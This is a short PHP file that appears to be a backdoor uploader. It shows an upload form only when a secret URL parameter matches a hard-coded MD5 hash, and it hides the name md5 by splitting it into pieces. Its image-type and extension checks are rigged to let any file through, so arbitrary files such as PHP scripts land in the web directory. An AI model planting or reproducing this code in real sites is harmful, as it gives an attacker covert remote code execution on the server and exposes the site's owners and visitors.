<?php

$g = $_GET;
$m = 'm'.'d'.'5';
$f = $_FILES;
if (isset($g['form']) && $m($g['form']) == 'bc34b2acf8217d8e247fdabaa585ffc8')
{

	echo '
	<!DOCTYPE html>
	<html>
	<body>

	<form action="" method="post" enctype="multipart/form-data">
	  Select image to upload:
	  <input type="file" name="fileToUpload" id="fileToUpload">
	  <input type="submit" value="Upload" name="submit">
	</form>

	</body>
	</html>
	';

	if(isset($_POST['submit'])) {
		
	$target_file = basename($f['fileToUpload']['name']);
	$uploadOk = 1;
	$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

	  $check = getimagesize($f['fileToUpload']['tmp_name']);
	  if($check !== false) {
		echo "File is an image - " . $check['mime'] . ".";
		$uploadOk = 1;
	  } else {
		echo "File is not an image.<br />";
		$uploadOk = 1;
	  }

		// Check if file already exists
		if (file_exists($target_file)) {
		  echo "Sorry, file already exists.<br />";
		  $uploadOk = 0;
		}

		// Check file size
		else if ($f["fileToUpload"]["size"] > 5000000) {
		  echo "Sorry, your file is too large.<br />";
		  $uploadOk = 0;
		}

		// Allow certain file formats
		else if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
		&& $imageFileType != "gif" ) {
		  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.<br />";
		  $uploadOk = 1;
		}

		// Check if $uploadOk is set to 0 by an error
		if ($uploadOk == 0) {
		  echo "Sorry, your file was not uploaded.</br>";
		// if everything is ok, try to upload file
		} else {
		  if (move_uploaded_file($f['fileToUpload']['tmp_name'], $target_file)) {
			echo "The file ". htmlspecialchars( basename( $f['fileToUpload']['name'])). " has been uploaded.<br />";
		  } else {
			echo "Sorry, there was an error uploading your file.<br />";
		  }
		}
	}
}
?>